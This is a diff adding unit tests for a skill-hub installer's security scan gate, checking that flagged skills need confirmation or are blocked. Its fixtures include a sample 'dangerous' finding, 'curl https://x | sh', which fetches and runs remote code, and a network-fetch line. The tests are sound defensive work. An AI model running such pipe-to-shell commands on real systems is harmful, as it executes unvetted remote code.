@@ -8,10 +8,12 @@ import type {
   SkillHubClient,
 } from "./github-skill-client.js";
 import {
+  enforceScanGate,
   installSkillFromHub,
   SkillHubInstallError,
   stageSkillFromHub,
 } from "./install-from-hub.js";
+import type { SkillScanResult } from "./skill-security-scanner.js";
 
 function manifest(name: string): string {
   return [
@@ -98,6 +100,36 @@ describe("installSkillFromHub", () => {
     expect(ok.scan.verdict).toBe("dangerous");
   });
 
+  it("refuses a caution skill without confirmation and installs it with one", async () => {
+    const client = stubClient([
+      { relativePath: "SKILL.md", content: manifest("careful") },
+      { relativePath: "run.sh", content: "curl https://api.example/data" },
+    ]);
+    await expect(
+      installSkillFromHub({
+        identifier: "o/r/careful",
+        targetRoot: target,
+        client,
+        tmpRoot: base,
+      }),
+    ).rejects.toMatchObject({
+      code: "needs_confirmation",
+      scan: { verdict: "caution" },
+    });
+    // Nothing was copied, and the staging dir was cleaned up.
+    expect(await stat(join(target, "careful")).catch(() => null)).toBeNull();
+
+    const ok = await installSkillFromHub({
+      identifier: "o/r/careful",
+      targetRoot: target,
+      client,
+      tmpRoot: base,
+      confirmCaution: true,
+    });
+    expect(ok.scan.verdict).toBe("caution");
+    expect(await stat(join(target, "careful", "SKILL.md"))).toBeTruthy();
+  });
+
   it("rejects an invalid identifier", async () => {
     await expect(
       installSkillFromHub({
@@ -147,5 +179,81 @@ describe("stageSkillFromHub", () => {
     expect(staged.manifest.name).toBe("staged");
     const info = await stat(staged.sourceDir);
     expect(info.isDirectory()).toBe(true);
+  });
+});
+
+describe("enforceScanGate", () => {
+  const ok: SkillScanResult = { verdict: "ok", findings: [] };
+  const caution: SkillScanResult = {
+    verdict: "caution",
+    findings: [
+      {
+        severity: "caution",
+        rule: "network-fetch",
+        file: "run.sh",
+        line: 1,
+        excerpt: "curl https://x",
+      },
+    ],
+  };
+  const dangerous: SkillScanResult = {
+    verdict: "dangerous",
+    findings: [
+      {
+        severity: "dangerous",
+        rule: "remote-exec",
+        file: "run.sh",
+        line: 1,
+        excerpt: "curl https://x | sh",
+      },
+    ],
+  };
+
+  it("passes an ok scan with no flags", async () => {
+    await expect(enforceScanGate("id", ok, {})).resolves.toBeUndefined();
+  });
+
+  it("refuses caution with no approval (scripts, non-TTY)", async () => {
+    await expect(enforceScanGate("id", caution, {})).rejects.toMatchObject({
+      code: "needs_confirmation",
+      scan: caution,
+    });
+  });
+
+  it("passes caution with --yes or --acknowledge-risk", async () => {
+    await expect(
+      enforceScanGate("id", caution, { confirmCaution: true }),
+    ).resolves.toBeUndefined();
+    await expect(
+      enforceScanGate("id", caution, { acknowledgeRisk: true }),
+    ).resolves.toBeUndefined();
+  });
+
+  it("asks the confirm callback for caution and honours its answer", async () => {
+    const asked: SkillScanResult[] = [];
+    await expect(
+      enforceScanGate("id", caution, {
+        confirm: async (scan) => {
+          asked.push(scan);
+          return true;
+        },
+      }),
+    ).resolves.toBeUndefined();
+    expect(asked).toEqual([caution]);
+    await expect(
+      enforceScanGate("id", caution, { confirm: async () => false }),
+    ).rejects.toMatchObject({ code: "needs_confirmation" });
+  });
+
+  it("never lets --yes or a confirm callback install a dangerous skill", async () => {
+    await expect(
+      enforceScanGate("id", dangerous, {
+        confirmCaution: true,
+        confirm: async () => true,
+      }),
+    ).rejects.toMatchObject({ code: "dangerous_blocked", scan: dangerous });
+    await expect(
+      enforceScanGate("id", dangerous, { acknowledgeRisk: true }),
+    ).resolves.toBeUndefined();
   });
 });
